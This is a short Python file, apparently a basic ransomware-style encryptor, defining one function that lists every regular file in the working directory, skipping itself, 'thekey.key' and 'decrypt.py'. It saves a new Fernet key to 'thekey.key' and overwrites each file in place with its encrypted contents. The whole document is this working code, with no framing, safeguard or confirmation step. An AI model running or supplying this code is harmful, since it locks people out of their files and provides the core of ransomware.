def encrypt():
    import os
    from cryptography.fernet import Fernet
    current_file_path = os.path.abspath(__file__)

    files = []

    for file in os.listdir():
        file_path = os.path.abspath(file)
        if file_path == current_file_path or file == "thekey.key" or file == "decrypt.py":
            continue
        if os.path.isfile(file):
            files.append(file)
    
    print(files)
    
    key = Fernet.generate_key()
    
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    
    for file in files:
        file_path = os.path.abspath(file)
        with open(file_path, "rb") as thefile:
            content = thefile.read()
            encrypted_content = Fernet(key).encrypt(content)
    
        with open(file_path, "wb") as thefile:
            thefile.write(encrypted_content)
            print(f"Encrypted file: {file_path}")